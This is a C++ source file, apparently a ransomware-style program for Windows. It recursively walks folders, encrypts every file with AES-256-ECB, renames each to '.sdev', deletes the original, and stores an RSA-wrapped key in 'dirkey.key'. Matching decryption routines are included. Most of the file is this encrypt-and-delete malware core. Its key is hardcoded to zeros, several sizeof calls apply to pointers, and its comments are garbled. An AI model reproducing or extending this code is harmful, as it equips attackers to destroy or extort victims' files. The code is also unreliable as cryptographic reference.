#include "fileEnc.hpp"


// ����� �̸� ��������
string getUserName() {
    DWORD username_len = UNLEN + 1;
    char userName[UNLEN + 1];

    GetUserNameA(userName, &username_len);
    return userName;
}


void SaveEncKey(RSA* pubKey, string& dirName, unsigned char* key) {

    // RSA ��ȣȭ
    std::vector<unsigned char> encryptedData(RSA_size(pubKey), 0);
    int result = RSA_public_encrypt(sizeof(key), key, encryptedData.data(), pubKey, RSA_PKCS1_PADDING);
    for (int i = 0; i < 32; i++) {
        printf("%02x", key[i]);
    }
    if (result == -1) {
        std::cerr << "Error encrypting data." << std::endl;
        RSA_free(pubKey);
    }

    string name = dirName + "\\";
    HANDLE handle = CreateFileA((name + "dirkey.key").c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (handle == INVALID_HANDLE_VALUE) {
        cout << "���� ���� ����" << endl;
        return;
    }
    WriteFile(handle, encryptedData.data(), sizeof(encryptedData.data()), NULL, NULL);

}

void GetDecKey(RSA* priKey, string& dirName, unsigned char* key) {
    DWORD size = 512;
    DWORD nRead;
    unsigned char buf[512] = { 0x00, };
    string name = dirName + "\\";
    HANDLE handle = CreateFileA((name + "dirkey.key").c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (handle == INVALID_HANDLE_VALUE) {
        cout << "���� ���� ����" << endl;
        return;
    }
    if (ReadFile(handle, buf, size, &nRead, NULL) != TRUE) {
        cout << "read dec key error" << "\n";
    }
    int result = RSA_private_decrypt(sizeof(buf), buf, key, priKey, RSA_PKCS1_PADDING);

}


void EncryptDir(RSA* pubKey, string& dirName) {
    unsigned char _key[32] = {0x00, }; // generateKey();
    SaveEncKey(pubKey, dirName, _key);

    WIN32_FIND_DATAA data;
    HANDLE hFind = nullptr;
    string folderName;

    string folder;
    string file;

    cout << "\n\n ********** " + dirName + " **********" << endl;
    hFind = FindFirstFileA((dirName + "\\*").c_str(), &data);

    if (hFind == INVALID_HANDLE_VALUE)return;

    do {
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            folder = data.cFileName;
            if (folder == "." || folder == "..") {
                continue;
            }
            folderName = dirName + "\\" + folder;
            cout << "[Folder] " << folderName << endl;
            EncryptDir(pubKey, folderName);
        }
        else {
            file = data.cFileName;
            cout << "[File] " << file << endl;
            EncryptFileByAES(_key, dirName, file);
        }
    } while (FindNextFileA(hFind, &data) != 0);

    FindClose(hFind);

}


void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName) {

    HANDLE handle1;
    HANDLE handle2;
    DWORD size;
    DWORD nRead;
    DWORD nWrite;
    string name = dirName + "\\" + fileName;
    unsigned char* plain_buf;
    unsigned char* cipher_buf;

    // ���� �̸� �� ������ .��ġ 
    size_t lastDot = name.find_last_of('.');
    string fileNameStem;
    string fileExtension;

    if (lastDot != string::npos) {
        fileNameStem = name.substr(0, lastDot);
        fileExtension = name.substr(lastDot + 1);
        if (fileExtension == "sdev" || fileExtension == "key") return;
    }
    else {
        fileNameStem = name;
    }
    // ��ȣȭ �� ���� �ҷ�����
    handle1 = CreateFileA(name.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    // ��ȣȭ �� �ۼ��� ���� �ҷ����� Ȯ���� .sdev �� ����
    handle2 = CreateFileA((fileNameStem + ".sdev").c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (handle1 == INVALID_HANDLE_VALUE || handle2 == INVALID_HANDLE_VALUE) {
        cout << "���� ���� ����" << endl;
        return;
    }

    // ���� ������ Ȯ��
    size = GetFileSize(handle1, NULL);
    size += 16 - size % 16;

    // ���� ������ ��ŭ ���� �Ҵ�
    plain_buf = (unsigned char*)calloc(size, sizeof(char));
    cipher_buf = (unsigned char*)calloc(size, sizeof(char));

    // ��ȣȭ�� ���� �о����
    if (ReadFile(handle1, plain_buf, size, &nRead, NULL) != TRUE) {
        cout << "fail to file open " << endl;
        return;
    }
    else {
        // ��ȣȭ
        EncryptText(plain_buf, (unsigned int)size, key, cipher_buf);
        if (WriteFile(handle2, cipher_buf, nRead, &nWrite, NULL) != TRUE)
            cout << "fail to file write" << endl;
        else
            cout << fileName << " file is encrypted" << endl;
    }
    CloseHandle(handle1);
    CloseHandle(handle2);

    DeleteFileA(name.c_str());

    free(plain_buf);
    free(cipher_buf);

}


// ���� ��ȣȭ
void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher) {
    AES aes(AESKeyLength::AES_256);
    memcpy(cipher, aes.EncryptECB(plain, plainLength, key), plainLength);
}




void DecryptDir(RSA* pubKey, string& dirName)
{
    unsigned char _key[32] = { 0x00, };
    GetDecKey(pubKey, dirName, _key);

    WIN32_FIND_DATAA data;
    HANDLE hFind = nullptr;
    string folderName;

    vector<string> folders;
    vector<string> files;

    cout << "\n\n ********** " + dirName + " **********" << endl;
    hFind = FindFirstFileA((dirName + "\\*").c_str(), &data);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            folders.push_back(data.cFileName);
        else
            files.push_back(data.cFileName);
    } while (FindNextFileA(hFind, &data) != 0);

    FindClose(hFind);


    // ���� ���
    for (string& file : files)
    {
        cout << "[File] " << file << endl;
        DecryptFileByAES(_key, dirName, file);
    }

    // ���� ���
    for (string& folder : folders)
    {
        if (folder == "." || folder == "..") {
            continue;
        }
        folderName = dirName + "\\" + folder;
        cout << "[Folder] " << folderName << endl;
        DecryptDir(pubKey, folderName);
    }
}


void DecryptFileByAES(unsigned char* key, string& dirName, string& fileName) {

    HANDLE handle1;
    HANDLE handle2;
    DWORD size;
    DWORD nRead;
    DWORD nWrite;
    string name = dirName + "\\" + fileName;
    unsigned char* plain_buf;
    unsigned char* cipher_buf;

    size_t lastDot = name.find_last_of('.');
    string fileNameStem;
    string fileExtension;

    if (lastDot != string::npos) {
        fileNameStem = name.substr(0, lastDot);
        fileExtension = name.substr(lastDot + 1);
        if (fileExtension != "sdev") return;
    }

    // ��ȣȭ �� ���� �ҷ�����
    handle1 = CreateFileA(name.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    // TODO: ��ȣȭ �� �ۼ��� ���� �ҷ����� Ȯ���� �����ϴ� �Լ� �ʿ�
    handle2 = CreateFileA((fileNameStem + ".dec").c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (handle1 == INVALID_HANDLE_VALUE || handle2 == INVALID_HANDLE_VALUE) {
        cout << "���� ���� ����" << endl;
        return;
    }

    // ���� ������ Ȯ��
    size = GetFileSize(handle1, NULL);
    size += 16 - size % 16;

    // ���� ������ ��ŭ ���� �Ҵ�
    plain_buf = (unsigned char*)calloc(size, sizeof(char));
    cipher_buf = (unsigned char*)calloc(size, sizeof(char));

    // ��ȣȭ�� ���� �о����
    if (ReadFile(handle1, plain_buf, size, &nRead, NULL) != TRUE)
    {
        cout << "fail to file open " << endl;
        return;
    }
    else
    {
        // ��ȣȭ
        DecryptText(plain_buf, (unsigned int)size, key, cipher_buf);
        // ��ȣȭ�� ���� .sdev ���Ͽ� �ۼ�
        if (WriteFile(handle2, cipher_buf, nRead, &nWrite, NULL) != TRUE)
        {
            cout << "fail to file write" << endl;
        }
        else {
            cout << fileName << " file is decrypted" << endl;
        }
    }
    CloseHandle(handle1);
    CloseHandle(handle2);

    DeleteFileA(name.c_str());

    free(plain_buf);
    free(cipher_buf);

}


// ���� ��ȣȭ
void DecryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher) {
    AES aes(AESKeyLength::AES_256);
    memcpy(cipher, aes.DecryptECB(plain, plainLength, key), plainLength);
}